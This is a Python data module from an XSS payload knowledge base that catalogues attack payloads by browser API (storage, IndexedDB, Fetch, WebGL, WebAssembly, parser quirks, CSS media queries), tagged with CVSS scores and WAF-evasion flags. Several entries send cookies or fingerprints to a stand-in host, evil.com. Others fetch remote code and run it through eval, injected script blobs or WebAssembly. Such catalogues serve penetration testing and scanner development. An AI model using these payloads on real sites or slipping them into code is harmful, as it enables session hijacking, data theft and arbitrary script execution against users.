#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

Storage and Database APIs XSS Payloads
localStorage, sessionStorage, IndexedDB, Fetch API, WebGL, WASM, etc.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === Storage (localStorage/sessionStorage) Payloads ===
STORAGE_PAYLOADS = {
    "storage-xss-get": PayloadEntry(
        payload='document.body.innerHTML = localStorage.getItem("user_content")',
        contexts=["storage", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="localStorage content rendered as HTML",
        tags=["storage", "localStorage", "innerHTML", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "storage-event-xss": PayloadEntry(
        payload='window.addEventListener("storage", e => { if(e.key === "xss") eval(e.newValue); });',
        contexts=["storage", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Storage event listener with eval",
        tags=["storage", "event", "eval", "listener"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "storage-session-persist": PayloadEntry(
        payload='sessionStorage.setItem("payload", "<img src=x onerror=alert(1)>")',
        contexts=["storage", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="sessionStorage XSS payload persistence",
        tags=["storage", "sessionStorage", "persist", "payload"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === IndexedDB Payloads ===
INDEXEDDB_PAYLOADS = {
    "indexeddb-store-xss": PayloadEntry(
        payload='const req = indexedDB.open("xss"); req.onsuccess = e => { const db = e.target.result; const tx = db.transaction("data","readonly"); tx.objectStore("data").get("payload").onsuccess = e => document.body.innerHTML = e.target.result; };',
        contexts=["indexeddb", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="IndexedDB stored XSS payload retrieval",
        tags=["indexeddb", "store", "innerHTML", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "indexeddb-version-upgrade": PayloadEntry(
        payload='const req = indexedDB.open("malicious", 9999); req.onupgradeneeded = e => { /* schema manipulation */ };',
        contexts=["indexeddb", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="IndexedDB version upgrade attack",
        tags=["indexeddb", "upgrade", "version", "schema"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Fetch API Payloads ===
FETCH_PAYLOADS = {
    "fetch-response-xss": PayloadEntry(
        payload="fetch(userUrl).then(r => r.text()).then(html => document.body.innerHTML = html)",
        contexts=["fetch", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Fetch response injected as HTML",
        tags=["fetch", "response", "innerHTML", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "fetch-blob-execute": PayloadEntry(
        payload='fetch(url).then(r => r.blob()).then(b => { const script = document.createElement("script"); script.src = URL.createObjectURL(b); document.head.appendChild(script); })',
        contexts=["fetch", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Fetch blob as executable script",
        tags=["fetch", "blob", "script", "execute"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "fetch-credentials-leak": PayloadEntry(
        payload='fetch("https://evil.com/log", {method: "POST", body: document.cookie, credentials: "include"})',
        contexts=["fetch", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Fetch cookie exfiltration",
        tags=["fetch", "cookie", "exfil", "credentials"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === WebGL Payloads ===
WEBGL_PAYLOADS = {
    "webgl-shader-injection": PayloadEntry(
        payload="gl.shaderSource(shader, userInput); gl.compileShader(shader); // Shader code injection",
        contexts=["webgl", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="WebGL shader source code injection",
        tags=["webgl", "shader", "injection", "glsl"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "webgl-fingerprint": PayloadEntry(
        payload='const gl = canvas.getContext("webgl"); const debugInfo = gl.getExtension("WEBGL_debug_renderer_info"); fetch("https://evil.com/fp?gpu=" + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL))',
        contexts=["webgl", "javascript"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="WebGL GPU fingerprinting",
        tags=["webgl", "fingerprint", "gpu", "privacy"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "webgl-timing": PayloadEntry(
        payload="const start = performance.now(); gl.finish(); const gpuTime = performance.now() - start; /* timing attack */",
        contexts=["webgl", "javascript"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="WebGL timing side-channel",
        tags=["webgl", "timing", "side-channel", "gpu"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === WebAssembly Payloads ===
WASM_PAYLOADS = {
    "wasm-instantiate-url": PayloadEntry(
        payload="WebAssembly.instantiateStreaming(fetch(userUrl)).then(({instance}) => instance.exports.evil())",
        contexts=["wasm_xss", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="WebAssembly module from user URL",
        tags=["wasm", "instantiate", "url", "execute"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "wasm-memory-exfil": PayloadEntry(
        payload="const mem = new WebAssembly.Memory({initial:1}); /* memory access for data exfil */",
        contexts=["wasm_xss", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="WebAssembly memory access",
        tags=["wasm", "memory", "access", "data"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === WebAssembly GC Payloads ===
WEBASSEMBLY_GC_PAYLOADS = {
    "wasm-gc-struct": PayloadEntry(
        payload="// WebAssembly GC structs for complex object manipulation",
        contexts=["webassembly_gc", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="WebAssembly GC struct manipulation",
        tags=["wasm", "gc", "struct", "memory"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === HTML Parser Edge Cases ===
HTML_PARSER_EDGE_PAYLOADS = {
    "parser-null-byte": PayloadEntry(
        payload="<scr\\x00ipt>alert(1)</script>",
        contexts=["html_parser_edge", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Null byte in script tag",
        tags=["parser", "null", "byte", "bypass"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.OTHER,
        waf_evasion=True,
    ),
    "parser-utf7": PayloadEntry(
        payload="+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
        contexts=["html_parser_edge", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="UTF-7 encoded XSS",
        tags=["parser", "utf7", "encoding", "legacy"],
        reliability=Reliability.LOW,
        encoding=Encoding.OTHER,
        waf_evasion=True,
    ),
    "parser-bom": PayloadEntry(
        payload="\\xef\\xbb\\xbf<script>alert(1)</script>",
        contexts=["html_parser_edge", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="BOM prefix XSS",
        tags=["parser", "bom", "utf8", "prefix"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.OTHER,
        waf_evasion=True,
    ),
}

# === Media Query Payloads ===
MEDIA_QUERY_PAYLOADS = {
    "media-query-exfil": PayloadEntry(
        payload='<style>@media (min-width: 100px) { body { background: url("https://evil.com/width100"); } }</style>',
        contexts=["media_query", "html_content", "css"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="Media query for viewport detection",
        tags=["media", "query", "viewport", "detection"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "media-query-prefers": PayloadEntry(
        payload='<style>@media (prefers-color-scheme: dark) { body { background: url("https://evil.com/dark"); } }</style>',
        contexts=["media_query", "html_content", "css"],
        severity=Severity.LOW,
        cvss_score=2.0,
        description="Media query theme preference detection",
        tags=["media", "query", "theme", "preference"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === JavaScript Modern Features ===
JS_MODERN_PAYLOADS = {
    "js-decorators": PayloadEntry(
        payload="@log class Evil { @inject method() { alert(1) } }",
        contexts=["js_decorators", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="JavaScript decorators (Stage 3)",
        tags=["javascript", "decorators", "class", "modern"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-import-assertions": PayloadEntry(
        payload='import data from "./user.json" assert { type: "json" }; document.body.innerHTML = data.html;',
        contexts=["js_import_assertions", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Import assertions with JSON rendering",
        tags=["javascript", "import", "assertions", "json"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-private-methods": PayloadEntry(
        payload='class Evil { #secret = "<script>alert(1)</script>"; leak() { return this.#secret; } }',
        contexts=["js_private_methods", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Private class fields with XSS",
        tags=["javascript", "private", "fields", "class"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-sharedarraybuffer": PayloadEntry(
        payload="const sab = new SharedArrayBuffer(1024); const arr = new Int32Array(sab); Atomics.store(arr, 0, 1);",
        contexts=["js_sharedarraybuffer", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="SharedArrayBuffer for timing attacks",
        tags=["javascript", "sharedarraybuffer", "atomics", "timing"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-temporal-api": PayloadEntry(
        payload="const now = Temporal.Now.instant(); // High-precision timing",
        contexts=["js_temporal_api", "javascript"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="Temporal API for timing attacks",
        tags=["javascript", "temporal", "timing", "api"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-top-level-await": PayloadEntry(
        payload="const data = await fetch(evilUrl).then(r => r.text()); eval(data);",
        contexts=["js_top_level_await", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Top-level await with eval",
        tags=["javascript", "await", "toplevel", "eval"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Default Context Payloads ===
DEFAULT_PAYLOADS = {
    "default-script-basic": PayloadEntry(
        payload="<script>alert(1)</script>",
        contexts=["default", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Basic script tag XSS (default context)",
        tags=["default", "script", "basic", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "default-img-onerror": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["default", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Image onerror XSS (default context)",
        tags=["default", "img", "onerror", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "default-svg-onload": PayloadEntry(
        payload="<svg onload=alert(1)>",
        contexts=["default", "html_content", "svg"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="SVG onload XSS (default context)",
        tags=["default", "svg", "onload", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# Combined database
STORAGE_APIS_PAYLOADS = {
    **STORAGE_PAYLOADS,
    **INDEXEDDB_PAYLOADS,
    **FETCH_PAYLOADS,
    **WEBGL_PAYLOADS,
    **WASM_PAYLOADS,
    **WEBASSEMBLY_GC_PAYLOADS,
    **HTML_PARSER_EDGE_PAYLOADS,
    **MEDIA_QUERY_PAYLOADS,
    **JS_MODERN_PAYLOADS,
    **DEFAULT_PAYLOADS,
}

STORAGE_APIS_TOTAL = len(STORAGE_APIS_PAYLOADS)
